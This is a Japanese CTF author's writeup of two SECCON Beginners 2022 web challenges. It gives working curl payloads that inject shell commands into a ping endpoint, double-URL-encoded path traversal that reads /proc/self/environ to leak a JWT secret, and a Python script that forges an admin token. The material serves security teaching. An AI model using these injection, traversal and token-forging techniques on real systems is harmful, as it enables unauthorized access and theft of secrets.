---
title: "SECCON Beginners CTF 2022【Web】Util Ironhand 作問者writeup"
description: "SECCON Beginners CTF 2022【Web】Util Ironhand 作問者writeup"
authors: [hi120ki]
tags: [CTF, SECCON, ctf4b]
slug: posts/20220605-2
---

SECCON Beginners CTF 2022で出題したWeb問題Util、Ironhandの作問者writeupです。

## Util (難易度 Beginner)

<!-- truncate -->

```
ctf4b networks社のネットワーク製品にはとっても便利な機能があるみたいです! でも便利すぎて不安かも...?
```

問題を見てみるとフォームに`127.0.0.1`など入力してcheckボタンを押すことでpingコマンドを指定したIPアドレスへ実行してくれるサービスのようです。

ソースコードを見てみると`/util/ping`へのPOSTリクエストのaddressパラメータを`ping -c 1 -W 1 指定アドレス 1>&2`に組み込んで実行しています。

```go
commnd := "ping -c 1 -W 1 " + param.Address + " 1>&2"
result, _ := exec.Command("sh", "-c", commnd).CombinedOutput()

c.JSON(200, gin.H{
  "result": string(result),
})
```

フロントエンドでのチェックがOK→リクエストを送信→バックエンドで実行という流れになっているので、リクエストを直接編集することでIPアドレスチェックをバイパスし、任意のコードが実行可能になります。

```
$ curl -X POST https://util.quals.beginners.seccon.jp/util/ping -H "Content-Type: application/json" -d '{"address":"127.0.0.1;ls"}'
{
  "result": "PING 127.0.0.1 (127.0.0.1): 56 data bytes\n64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.080 ms\n\n--- 127.0.0.1 ping statistics ---\n1 packets transmitted, 1 packets received, 0% packet loss\nround-trip min/avg/max = 0.080/0.080/0.080 ms\napi\npages\n"
}
```

配布ファイルのDockerfileを見てみるとフラグが`/flag_???.txt`にあるとわかるので

```
RUN echo "ctf4b{xxxxxxxxxxxxxxxxxx}" > /flag_$(cat /dev/urandom | tr -dc "a-zA-Z0-9" | fold -w 16 | head -n 1).txt
```

```
$ curl -X POST https://util.quals.beginners.seccon.jp/util/ping -H "Content-Type: application/json" -d '{"address":"127.0.0.1;ls /"}'
{
  "result": "PING 127.0.0.1 (127.0.0.1): 56 data bytes\n64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.069 ms\n\n--- 127.0.0.1 ping statistics ---\n1 packets transmitted, 1 packets received, 0% packet loss\nround-trip min/avg/max = 0.069/0.069/0.069 ms\napp\nbin\ndev\netc\nflag_A74FIBkN9sELAjOc.txt\nhome\n...\n"
}
```

フラグファイルが`/flag_A74FIBkN9sELAjOc.txt`と判明し

```
$ curl -X POST https://util.quals.beginners.seccon.jp/util/ping -H "Content-Type: application/json" -d '{"address":"127.0.0.1;cat /flag_A74FIBkN9sELAjOc.txt"}'
{
  "result": "PING 127.0.0.1 (127.0.0.1): 56 data bytes\n64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.195 ms\n\n--- 127.0.0.1 ping statistics ---\n1 packets transmitted, 1 packets received, 0% packet loss\nround-trip min/avg/max = 0.195/0.195/0.195 ms\nctf4b{al1_0vers_4re_i1l}\n"
}
```

## Ironhand (難易度 Medium)

docker-compose.ymlファイルを見ると3つのサービスapp secret nginxが動作していることが分かります。

appではログイン機構があり、ユーザー名を指定するとjwtトークンを生成しcookieへ付与し、ログイン後の画面が見れるようになります。

```go
// Generate JWT token
claims := &UserClaims{
  &jwt.RegisteredClaims{
    ExpiresAt: jwt.NewNumericDate(time.Now().Add(time.Hour * 24 * 7)),
  },
  username,
  false,
}
token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
secretKey := os.Getenv("JWT_SECRET_KEY")
tokenString, _ := token.SignedString([]byte(secretKey))

// Set JWT token in cookie
cookie := &http.Cookie{
  Name:    "JWT_KEY",
  Value:   tokenString,
  Expires: time.Now().Add(time.Hour * 24 * 7),
}
c.SetCookie(cookie)
```

secretではフラグ文字列を返すサービスで、appでadmin(管理者)としてログインしたときに取得できる仕組みになっています。

```go
// If you are admin, you can get FLAG
if claims.IsAdmin {
  res, _ := http.Get("http://secret")
  flag, _ := ioutil.ReadAll(res.Body)
  if err := res.Body.Close(); err != nil {
    return c.String(http.StatusInternalServerError, "Internal Server Error")
  }
  return c.Render(http.StatusOK, "admin", map[string]interface{}{
    "username": claims.Username,
    "flag":     string(flag),
  })
}
```

appのログイン機構ではjwtのpayloadのうち、admin(管理者)かどうかを判定するIsAdminパラメータが必ずfalseであるjwtトークンを出力するようになっているためadmin(管理者)としてログインできません。

```go
// Generate JWT token
claims := &UserClaims{
  &jwt.RegisteredClaims{
    ExpiresAt: jwt.NewNumericDate(time.Now().Add(time.Hour * 24 * 7)),
  },
  username,
  false, // ここがIsAdminパラメータ
}
```

今回のjwtトークン生成はHS256形式で行っており、ユーザー名とIsAdminパラメータを含んだpayloadを`JWT_SECRET_KEY`で署名することで生成しています。ですのでIsAdminパラメータがtrueのトークンを生成するためには環境変数で指定されている`JWT_SECRET_KEY`が必要になります。

ここでappの実装を見てみるとファイル取得を行う`/static`エンドポイントの実装がパストラバーサルが可能になっていることが分かります。

```go
e.GET("/static/:file", func(c echo.Context) error {
  path, _ := url.QueryUnescape(c.Param("file"))
  f, err := ioutil.ReadFile("static/" + path)
  if err != nil {
    return c.String(http.StatusNotFound, "No such file")
  }
  return c.Blob(http.StatusOK, mime.TypeByExtension(filepath.Ext(path)), []byte(f))
})
```

もしpathに`../`などを指定できれば上の階層のファイルを取得できます。

また`JWT_SECRET_KEY`は環境変数で指定されていますがLinuxではプロセスからそのプロセスへ付与されている環境変数を`/proc/self/environ`から取得できる仕組みがあります。

よってpathに`../../proc/self/environ`を指定して`JWT_SECRET_KEY`を取得→IsAdminパラメータがtrueのjwtトークンを偽造することでフラグを取得できます。

ただし、appへアクセスするときにはnginxを経由する構成になっており、nginxでURL中の`../`が弾かれてしまうためそのまま指定するだけでは`JWT_SECRET_KEY`を取得できません。

appでは`url.QueryUnescape`というURLエンコードされた文字列をデコードする処理が行われていますがこれは2回URLエンコードを行った文字列のデコードにも対応している関数なので`../../proc/self/environ`を2回URLエンコードを行った文字列`%252e%252e%252f%252e%252e%252fproc/self/environ`を指定することでnginxに弾かれることなく`JWT_SECRET_KEY`を取得できます

```
$ curl "https://ironhand.quals.beginners.seccon.jp/static/%252e%252e%252f%252e%252e%252fproc/self/environ" -o env.txt ; cat env.txt ; rm env.txt
HOSTNAME=a98210d82749JWT_SECRET_KEY=U6hHFZEzYGwLEezWHMjf3QM83Vn2D13dSHLVL=1HOME=/home/appuserPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binPWD=/app
```

`JWT_SECRET_KEY=U6hHFZEzYGwLEezWHMjf3QM83Vn2D13d`と取得できたのでこれでjwtトークンを偽造することでフラグを取得できます。

```python
import re, os
import requests
import jwt
import time


def crawl(url):
    try:
        s = requests.Session()
        req = requests.Request(
            method="GET",
            url=url,
        )
        prep = req.prepare()
        prep.url = url + "/static/%252e%252e%252f%252e%252e%252fproc/self/environ"
        res = s.send(prep, verify=False, timeout=3)
        res.raise_for_status()
        m = re.search(r"JWT_SECRET_KEY=(.*)SHLVL=", res.text)
        secret_key = m.group(1)[0:32]
        print(secret_key)

        header = {"typ": "JWT", "alg": "HS256"}
        payload = {
            "exp": int(time.time()) + 1000000,
            "Username": "test",
            "IsAdmin": True,
        }
        token = jwt.encode(
            payload=payload,
            key=secret_key,
            algorithm="HS256",
            headers=header,
        )
        print(token)

        cookies = dict(JWT_KEY=token)
        r = requests.get(url, cookies=cookies, timeout=3)
        print(r.text)
        return 0
    except Exception as e:
        print(e)
        return 2


if __name__ == "__main__":
    print(crawl("https://ironhand.quals.beginners.seccon.jp"))
```

`ctf4b{i7s_funny_h0w_d1fferent_th1ng3_10ok_dep3ndin6_0n_wh3re_y0u_si7}`

> Double encoding以外にもNginxの設定で`merge_slashes off`となっていることから`/`の数を増やして
>
> ```
> $ curl --path-as-is "https://ironhand.quals.beginners.seccon.jp/static/..//../proc/self/environ" -o env.txt ; cat env.txt ; rm env.txt
> $ curl --path-as-is "https://ironhand.quals.beginners.seccon.jp/static//../../proc/self/environ" -o env.txt ; cat env.txt ; rm env.txt
> ```
>
> でも取得できます。
>
> 他にも`/proc/self/environ`の`self`は`1`でもOKなので
>
> ```
> $ curl "https://ironhand.quals.beginners.seccon.jp/static/%252e%252e%252f%252e%252e%252fproc/1/environ" -o env.txt ; cat env.txt ; rm env.txt
> $ curl --path-as-is "https://ironhand.quals.beginners.seccon.jp/static/..//../proc/1/environ" -o env.txt ; cat env.txt ; rm env.txt
> ```
>
> でも取得できます。
